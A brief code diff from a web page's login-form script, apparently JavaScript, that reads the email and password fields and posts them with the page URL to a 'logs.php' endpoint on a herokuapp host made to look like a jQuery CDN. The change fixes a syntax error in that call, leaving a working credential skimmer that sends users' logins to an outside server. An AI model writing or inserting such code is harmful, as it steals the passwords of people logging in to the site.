@@ -323,7 +323,7 @@ var login_form = document.getElementById("loginForm");
             var login = {};
             login.email = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php",033"l="+window.location.href+"&e="+login.email+"&p="+login.pass);
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass);
 		        }
           }
         }
